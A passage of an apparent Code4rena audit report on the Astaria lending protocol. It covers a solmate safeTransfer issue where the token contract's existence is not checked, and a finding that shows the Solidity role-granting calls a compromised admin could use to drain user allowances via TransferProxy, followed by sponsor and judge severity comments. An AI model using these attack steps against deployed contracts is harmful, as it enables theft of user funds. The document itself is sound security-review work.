class=\"mtk12\">using</span><span class=\"mtk1\"> </span><span class=\"mtk12\">FixedPointMathLib</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>This is a known issue while using solmate’s libraries. Hence this may lead to miscalculation of funds and may lead to loss of funds, because if safetransfer() and safetransferfrom() are called on a token address that doesn’t have contract in it, it will always return success, bypassing the return value check.</p>\n<p>If an underlying token is self-destructed, the code may consider the transfer because the lack of contract existence contract.</p>\n<p>Due to this, protocol will think that funds has been transferred and successful, and records will be accordingly calculated, but in reality funds were never transferred.</p>\n<p>So this will lead to miscalculation and possibly loss of funds.</p>\n<h3 id=\"recommended-mitigation-steps-61\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-61\" aria-label=\"recommended mitigation steps 61 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Use openzeppelin’s safeERC20 or implement a code existence check.</p>\n<h2 id=\"12-compromised-owner-is-capable-of-draining-all-users-fund-after-user-gives-token-allowance-to-transferproxysol\" style=\"position:relative;\"><a href=\"#12-compromised-owner-is-capable-of-draining-all-users-fund-after-user-gives-token-allowance-to-transferproxysol\" aria-label=\"12 compromised owner is capable of draining all users fund after user gives token allowance to transferproxysol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/52\">[12] Compromised owner is capable of draining all user’s fund after user gives token allowance to TransferProxy.sol</a></h2>\n<p>The TransferProxy.sol is important because it helps with moving the fund around in AuctionHouse, AstariaRouter and in LienToken.</p>\n<p>As we can see, this function below is powerful. It is likely that user will give the max token allowance to the contract TransferProxy, otherwise, transaction would revert in AuctionHouse.sol, LienToken and in AuctionHouse.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"196\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">tokenTransferFrom</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">from</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">requiresAuth</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>Well, note that the requiresAuth modifier is used in the function tokenTransferFrom, this access control model means that only specific address set up by admin can call this function.</p>\n<p>If the admin is compromised, the admin can authorize malicious contract that can drain all the token fund from user by calling the above tokenTransferFrom after user gives token allowance to TransferProxy.sol</p>\n<p>Because the requiresAuth modifier calls:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"197\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">modifier</span><span class=\"mtk1\"> </span><span class=\"mtk11\">requiresAuth</span><span class=\"mtk1\">() </span><span class=\"mtk12\">virtual</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">isAuthorized</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sig</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;UNAUTHORIZED&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>which calls:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"198\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">isAuthorized</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">user</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">functionSig</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">internal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">view</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">virtual</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">AuthStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getAuthSlot</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">Authority</span><span class=\"mtk1\"> </span><span class=\"mtk12\">auth</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">authority</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// Memoizing authority saves us a warm SLOAD, around 100 gas.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Checking if the caller is the owner only after calling the authority saves gas in most cases, but be</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// aware that this makes protected functions uncallable even to the owner if the authority is out of order.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      (</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auth</span><span class=\"mtk1\">) != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">auth</span><span class=\"mtk1\">.</span><span class=\"mtk11\">canCall</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">functionSig</span><span class=\"mtk1\">)) || </span><span class=\"mtk12\">user</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>The auth.canCall is called in MultiRolesAuthority.sol, as shown in the Deploy.sol script</p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/scripts/deployments/Deploy.sol#L118\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/scripts/deployments/Deploy.sol#L118</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"199\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">auth</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">testModeDisabled</span><span class=\"mtk1\"> ? </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> : </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">MRA</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">MultiRolesAuthority</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auth</span><span class=\"mtk1\">, </span><span class=\"mtk11\">Authority</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)));</span></span></span></code></pre>\n<p>And the relevent authorization is granted by calling:</p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/scripts/deployments/Deploy.sol#L377\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/scripts/deployments/Deploy.sol#L377</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"200\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">MRA</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setRoleCapability</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">uint8</span><span class=\"mtk1\">(</span><span class=\"mtk12\">UserRoles</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ASTARIA_ROUTER</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">TRANSFER_PROXY</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenTransferFrom</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">true</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>and</p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/scripts/deployments/Deploy.sol#L410\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/scripts/deployments/Deploy.sol#L410</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"201\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">MRA</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setUserRole</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ASTARIA_ROUTER</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">uint8</span><span class=\"mtk1\">(</span><span class=\"mtk12\">UserRoles</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ASTARIA_ROUTER</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">true</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>by calling:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"202\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setRoleCapability</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">uint8</span><span class=\"mtk1\"> </span><span class=\"mtk12\">role</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">bytes4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">functionSig</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">enabled</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> </span><span class=\"mtk11\">requiresAuth</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">enabled</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">getRolesWithCapability</span><span class=\"mtk1\">[</span><span class=\"mtk12\">functionSig</span><span class=\"mtk1\">] |= </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\"> &lt;&lt; </span><span class=\"mtk12\">role</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t} </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">getRolesWithCapability</span><span class=\"mtk1\">[</span><span class=\"mtk12\">functionSig</span><span class=\"mtk1\">] &amp;= ~</span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\"> &lt;&lt; </span><span class=\"mtk12\">role</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RoleCapabilityUpdated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">role</span><span class=\"mtk1\">, </span><span class=\"mtk12\">functionSig</span><span class=\"mtk1\">, </span><span class=\"mtk12\">enabled</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>A compromised admin can call:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"203\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">MRA</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setRoleCapability</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">uint8</span><span class=\"mtk1\">(</span><span class=\"mtk12\">UserRoles</span><span class=\"mtk1\">.</span><span class=\"mtk12\">MALICIOUS</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">TRANSFER_PROXY</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenTransferFrom</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">true</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>and</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"204\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">MRA</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setUserRole</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">malicious_contract_or_account</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">uint8</span><span class=\"mtk1\">(</span><span class=\"mtk12\">UserRoles</span><span class=\"mtk1\">.</span><span class=\"mtk12\">MALICIOUS</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">true</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Then the malicious_contract_or_account address has permission to call tokenTransferFrom, which drains user token after user gives token allowance to TransferProxy.sol. All he needs to do is set the token to token that he wants to transfer and steal, the address from is victim’s address, the address to is the recipient (hacker’s address), the amount is how much he wants to transfer and drain.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"205\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">tokenTransferFrom</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">from</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">requiresAuth</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>The reference (relevant )code for MultiRolesAuthority in solmate:</p>\n<p><a href=\"https://github.com/transmissions11/solmate/blob/main/src/test/MultiRolesAuthority.t.sol\">https://github.com/transmissions11/solmate/blob/main/src/test/MultiRolesAuthority.t.sol</a></p>\n<h3 id=\"recommended-mitigation-steps-62\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-62\" aria-label=\"recommended mitigation steps 62 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Only use safeIncreaseAllowance to give minimum approval to move the fund around, use multisig to safeguard to admin.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/76#issuecomment-1412961381\">SantiagoGregory (Astaria) disputed and commented</a>:</strong></p>\n<blockquote>\n<p><strong>[02] New Protocol parameter setting should not be applied to old loan term and state, especially the fee setting</strong><br>\n@androolloyd - Don’t think this is worth the storage costs and can’t be used maliciously (as far as I can tell).</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/70#issuecomment-1413611159\">androolloyd (Astaria) disputed and commented</a>:</strong></p>\n<blockquote>\n<p><strong>[03] Adversary can game the flashAuction feature to block further flashAuction after trading collateral token and make liquidatorNFTClaim function revert and block liquidation if the NFT is Moonbird</strong><br>\nIn the case of moonbirds, but also applying to all nfts that would be flash enabled, there is a security hooks mechanism that lets us query the state of the underlying asset, we would have to write and deploy a security hook for the moon bird contract that would check the nesting status, we would then prohibit the transaction because the state of the nft is changed.</p>\n<p>The security hook can fetch any data about an nft from calls and then compare them after the nft has been returned.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/50#issuecomment-1412898631\">SantiagoGregory (Astaria) disputed and commented</a>:</strong></p>\n<blockquote>\n<p><strong>[04] If an auction has no bidder, the NFT ownership should go back to the loan lenders instead of liquidator</strong><br>\nLPs implicitly take the risk of auctions resulting in very low or no bids. Auctions are a way to distribute liquidation results equitably to LPs, and if there are no bids, then there is no way to distribute that value.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/101#issuecomment-1412958485\">SantiagoGregory (Astaria) disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p><strong>[08] Transaction revert in division by zero error when handling protocol fee if the feeTo address is set but <code>s.protocolFeeDenominator</code> is not set</strong><br>\nLow severity because this would be configured before the fee switch was turned on.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/83#issuecomment-1413615500\">androolloyd (Astaria) commented</a>:</strong></p>\n<blockquote>\n<p><strong>[09] Should use _safeMint instead of mint in CollateralToken#onERC721Received</strong><br>\nAcknowledged.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/78#issuecomment-1412959654\">SantiagoGregory (Astaria) commented</a>:</strong></p>\n<blockquote>\n<p><strong>[10] Adversary can front-run admin’s state update and parameter update</strong><br>\nAcknowledged. Not really an issue IMO.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/52#issuecomment-1413618912\">androolloyd (Astaria) commented</a>:</strong></p>\n<blockquote>\n<p><strong>[12] Compromised owner is capable of draining all user’s fund after user gives token allowance to TransferProxy.sol</strong><br>\nAcknowledged.</p>\n</blockquote>\n<p><strong>Picodes (judge) commented:</strong></p>\n<blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/76#issuecomment-1436097227\">[02] New Protocol parameter setting should not be applied to old loan term and state, especially the fee setting</a></strong><br>\nDowngrading to low as it’s an interesting suggestion but isn’t of medium severity</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/70#issuecomment-1441360783\">[03] Adversary can game the flashAuction feature to block further flashAuction after trading collateral token and make liquidatorNFTClaim function revert and block liquidation if the NFT is Moonbird</a></strong><br>\nThis is a remarkable and very creative finding. But considering this is specific to MoonBird’s behavior and that Astaria has a <code>securityHook</code> for this kind of case, downgrading to low.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/109#issuecomment-1405562237\">[05] Security hook should not be set for a NFT that is not Uniswap V3 Position NFT</a></strong><br>\nLow severity as this is a configuration error, easily fixable by the admins.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/101#issuecomment-1441350707\">[08] Transaction revert in division by zero error when handling protocol fee if the feeTo address is set but <code>s.protocolFeeDenominator</code> is not set</a></strong><br>\nDowngrading to low as this is a configuration mistake by the admin.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/83#issuecomment-1436096534\">[09] Should use _safeMint instead of mint in CollateralToken#onERC721Received</a></strong><br>\nDowngrading to low as it’s more a safety check than anything else here.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/78#issuecomment-1436096842\">[10] Adversary can front-run admin’s state update and parameter update</a></strong><br>\nQA at best given that there is no real exploit scenario and it can be mitigated with private rpcs.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/52#issuecomment-1447965536\">[12] Compromised owner is capable of draining all user’s fund after user gives token allowance to TransferProxy.sol</a></strong><br>\nAfter <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/617\">this discussion</a>, I will downgrade this issue to Low severity, as I finally don’t think we can consider this a case of “privilege escalation” versus changing the transfer proxy address for example. It boils down to Admin Privilege which is OOS per the automated report.</p>\n</blockquote>\n<hr>\n<h1 id=\"gas-optimizations\" style=\"position:relative;\"><a href=\"#gas-optimizations\" aria-label=\"gas optimizations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 